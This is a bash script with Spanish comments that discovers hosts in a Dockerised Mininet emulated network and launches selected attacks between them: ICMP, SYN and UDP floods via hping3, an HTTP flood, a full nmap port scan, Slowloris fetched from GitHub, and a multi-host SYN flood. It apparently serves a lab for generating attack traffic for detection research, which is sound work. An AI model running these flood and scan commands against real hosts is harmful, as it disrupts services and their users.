#!/usr/bin/env bash
# auto_attack.sh
# Detecta hosts en Mininet (dentro del contenedor) y ejecuta un ataque seleccionado
# Uso:
#   ./auto_attack.sh <attack> [--attacker hX] [--victim hY] [--duration N]
#
# ataques:
#   icmp        -> ICMP flood
#   syn         -> SYN flood
#   udp         -> UDP flood
#   http        -> HTTP flood simple
#   portscan    -> escaneo masivo de puertos con nmap
#   slowloris   -> ataque low&slow HTTP con script oficial Python
#   distributed -> DDoS simulado desde múltiples hosts
#
# ejemplos:
#   ./auto_attack.sh syn --attacker h1 --victim h2 --duration 15
#   ./auto_attack.sh slowloris --attacker h1 --victim h2 --duration 30
#   ./auto_attack.sh distributed --victim h2 --duration 20
set -euo pipefail

ATTACK=${1:-}
shift || true
ATTACK=${ATTACK,,}

DURATION=10
ATTACKER=""
VICTIM=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --attacker)
      if [[ $# -lt 2 ]]; then
        echo "Missing value for --attacker"
        exit 1
      fi
      ATTACKER="$2"
      shift 2
      ;;
    --victim)
      if [[ $# -lt 2 ]]; then
        echo "Missing value for --victim"
        exit 1
      fi
      VICTIM="$2"
      shift 2
      ;;
    --duration)
      if [[ $# -lt 2 ]]; then
        echo "Missing value for --duration"
        exit 1
      fi
      DURATION="$2"
      shift 2
      ;;
    -h|--help)
      echo "Usage: $0 <icmp|syn|udp|http|portscan|slowloris|distributed> [--attacker h1] [--victim h2] [--duration 10]"
      exit 0
      ;;
    *)
      echo "Unknown arg $1"
      exit 1
      ;;
  esac
done

if [[ -z "$ATTACK" ]]; then
  echo "Specify attack type: icmp|syn|udp|http|portscan|slowloris|distributed"
  exit 1
fi

# Ensure mininet container is running
if ! docker compose ps --services --filter "status=running" | grep -q "mininet"; then
  echo "Mininet container not running. Start with: docker compose up -d" >&2
  exit 1
fi

# Helper to run commands inside mininet container
dc_exec() {
  docker compose exec -T mininet bash -lc "$*"
}

# Get list of host PIDs and names from the Mininet container
mapfile -t host_lines < <(dc_exec "ps -eo pid,args | grep -E 'mininet:.*h[0-9]+' || true")
if [[ ${#host_lines[@]} -eq 0 ]]; then
  echo "No Mininet host processes found in container." >&2
  exit 1
fi

declare -A pid_to_name
declare -A name_to_pid

for line in "${host_lines[@]}"; do
  pid=$(echo "$line" | awk '{print $1}')
  name=$(echo "$line" | sed -n 's/.*mininet:\([a-zA-Z0-9_-]*\).*/\1/p')
  if [[ -n "$pid" && -n "$name" ]]; then
    pid_to_name[$pid]=$name
    name_to_pid[$name]=$pid
  fi
done

# Query each host namespace for IPv4 address
declare -A name_to_ip
for name in "${!name_to_pid[@]}"; do
  pid=${name_to_pid[$name]}
  ips=$(dc_exec "mnexec -a $pid ip -4 addr show 2>/dev/null | awk '/inet/ {print \$2}' | cut -d'/' -f1 || true")
  ip_non_loop=$(echo "$ips" | grep -v '^127\.' | head -n1 || true)
  if [[ -n "$ip_non_loop" ]]; then
    name_to_ip[$name]="$ip_non_loop"
  else
    ip_first=$(echo "$ips" | head -n1 || true)
    name_to_ip[$name]="${ip_first:-}"
  fi
done

echo "Discovered hosts (name -> pid -> ip):"
for name in $(echo "${!name_to_pid[@]}" | tr ' ' '\n' | sort); do
  echo "  $name -> pid=${name_to_pid[$name]} ip=${name_to_ip[$name]:-N/A}"
done

# Sort host list
all_hosts=($(for n in "${!name_to_pid[@]}"; do echo "$n"; done | sort))

# Default attacker
if [[ -z "$ATTACKER" ]]; then
  ATTACKER=${all_hosts[0]}
fi

# Default victim
if [[ -z "$VICTIM" ]]; then
  for h in "${all_hosts[@]}"; do
    if [[ "$h" != "$ATTACKER" && -n "${name_to_ip[$h]:-}" ]]; then
      VICTIM=$h
      break
    fi
  done
  if [[ -z "$VICTIM" && ${#all_hosts[@]} -gt 1 ]]; then
    VICTIM=${all_hosts[1]}
  fi
fi

if [[ -z "$VICTIM" ]]; then
  echo "Could not determine victim host." >&2
  exit 1
fi

ATTACKER_PID=${name_to_pid[$ATTACKER]:-}
VICTIM_PID=${name_to_pid[$VICTIM]:-}
ATTACKER_IP=${name_to_ip[$ATTACKER]:-}
VICTIM_IP=${name_to_ip[$VICTIM]:-}

if [[ -z "$VICTIM_IP" ]]; then
  echo "Victim $VICTIM has no IP assigned. Aborting." >&2
  exit 1
fi

echo "Using attacker=$ATTACKER (pid=${ATTACKER_PID:-N/A} ip=${ATTACKER_IP:-N/A})"
echo "Using victim=$VICTIM (pid=$VICTIM_PID ip=$VICTIM_IP)"

check_tool() {
  if ! dc_exec "command -v $1 >/dev/null 2>&1"; then
    echo "❌ Error: Tool '$1' not found inside Mininet container." >&2
    echo "   Quick fix: docker compose exec mininet apt-get update && docker compose exec mininet apt-get install -y $1" >&2
    exit 1
  fi
}

cleanup_common() {
  dc_exec "pkill hping3 >/dev/null 2>&1 || true"
  dc_exec "pkill -f iperf3 >/dev/null 2>&1 || true"
  dc_exec "pkill -f http.server >/dev/null 2>&1 || true"
}

echo "Executing attack '$ATTACK' for ${DURATION}s..."

case "$ATTACK" in
  icmp)
    check_tool hping3
    dc_exec "mnexec -a $ATTACKER_PID hping3 -1 --flood $VICTIM_IP >/tmp/auto_hping.log 2>&1 & sleep $DURATION; pkill hping3 || true"
    ;;

  syn)
    check_tool hping3
    check_tool iperf3
    dc_exec "mnexec -a $VICTIM_PID iperf3 -s -p 5001 >/dev/null 2>&1 &"
    dc_exec "mnexec -a $ATTACKER_PID hping3 -S -p 5001 --flood $VICTIM_IP >/tmp/auto_hping.log 2>&1 & sleep $DURATION; pkill hping3 || true; pkill -f iperf3 || true"
    ;;

  udp)
    check_tool hping3
    check_tool iperf3
    dc_exec "mnexec -a $VICTIM_PID iperf3 -s -p 5001 >/dev/null 2>&1 &"
    dc_exec "mnexec -a $ATTACKER_PID hping3 --udp -p 5001 --flood $VICTIM_IP >/tmp/auto_hping.log 2>&1 & sleep $DURATION; pkill hping3 || true; pkill -f iperf3 || true"
    ;;

  http)
    dc_exec "mnexec -a $VICTIM_PID python3 -m http.server 80 >/dev/null 2>&1 &"
    dc_exec "mnexec -a $ATTACKER_PID bash -lc 'if command -v ab >/dev/null 2>&1; then ab -t $DURATION -n 1000000 -c 50 http://$VICTIM_IP/ >/tmp/auto_ab.log 2>&1; elif command -v curl >/dev/null 2>&1; then end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do curl -s http://$VICTIM_IP/ >/dev/null; done; elif command -v wget >/dev/null 2>&1; then end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do wget -qO- http://$VICTIM_IP/ >/dev/null; done; else end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do python3 -c \"import urllib.request; urllib.request.urlopen('\\''http://$VICTIM_IP/'\\'')\" >/dev/null 2>&1; done; fi'"
    dc_exec "mnexec -a $VICTIM_PID pkill -f http.server || true"
    ;;

  portscan)
    check_tool nmap
    echo "Running massive port scan against $VICTIM_IP for up to ${DURATION}s..."
    dc_exec "mnexec -a $ATTACKER_PID timeout $DURATION nmap -T4 -p 1-65535 $VICTIM_IP > /tmp/auto_nmap.log 2>&1 || true"
    ;;

  slowloris)
    check_tool git
    check_tool python3

    echo "Starting HTTP server on victim $VICTIM..."
    dc_exec "mnexec -a $VICTIM_PID python3 -m http.server 80 >/dev/null 2>&1 &"

    echo "Preparing official Slowloris script inside mininet container..."
    dc_exec "
      if [ ! -d /tmp/slowloris ]; then
        git clone https://github.com/gkbrk/slowloris.git /tmp/slowloris >/tmp/auto_slowloris_setup.log 2>&1 || true
      else
        cd /tmp/slowloris && git pull >/tmp/auto_slowloris_setup.log 2>&1 || true
      fi
    "

    echo "Running Slowloris from $ATTACKER to $VICTIM_IP for ${DURATION}s..."
    dc_exec "
      mnexec -a $ATTACKER_PID bash -lc '
        timeout $DURATION python3 /tmp/slowloris/slowloris.py $VICTIM_IP -s 500
      ' > /tmp/auto_slowloris.log 2>&1 || true
    "

    echo "Cleaning up HTTP server on victim..."
    dc_exec "mnexec -a $VICTIM_PID pkill -f http.server || true"
    ;;

  distributed)
    check_tool hping3
    check_tool iperf3

    echo "Starting iperf3 server on victim $VICTIM..."
    dc_exec "mnexec -a $VICTIM_PID iperf3 -s -p 5001 >/dev/null 2>&1 &"

    attackers=()
    for h in "${all_hosts[@]}"; do
      if [[ "$h" != "$VICTIM" ]]; then
        attackers+=("$h")
      fi
    done

    if [[ ${#attackers[@]} -eq 0 ]]; then
      echo "No attacker hosts available for distributed attack." >&2
      exit 1
    fi

    echo "Distributed attackers: ${attackers[*]}"
    for h in "${attackers[@]}"; do
      pid=${name_to_pid[$h]}
      echo "Launching from $h -> $VICTIM_IP"
      dc_exec "mnexec -a $pid hping3 -S -p 5001 --flood $VICTIM_IP >/tmp/auto_hping_${h}.log 2>&1 &"
    done

    sleep "$DURATION"

    echo "Stopping distributed attack..."
    dc_exec "pkill hping3 >/dev/null 2>&1 || true"
    dc_exec "pkill -f iperf3 >/dev/null 2>&1 || true"
    ;;

  *)
    echo "Unknown attack '$ATTACK'"
    exit 2
    ;;
esac

echo "Attack finished."
echo "--- Last logs ---"
dc_exec "
  tail -n 5 /tmp/auto_hping.log 2>/dev/null \
  || tail -n 5 /tmp/auto_ab.log 2>/dev/null \
  || tail -n 5 /tmp/auto_nmap.log 2>/dev/null \
  || tail -n 5 /tmp/auto_slowloris.log 2>/dev/null \
  || ls /tmp/auto_hping_*.log >/dev/null 2>&1 && for f in /tmp/auto_hping_*.log; do echo \"== \$f ==\"; tail -n 3 \"\$f\"; done \
  || echo 'No logs found'
"
echo "-----------------"

echo "To inspect victim counters:"
echo "  PID_VICTIM=$VICTIM_PID"
echo "  docker compose exec -T mininet mnexec -a $VICTIM_PID cat /proc/net/dev"

exit 0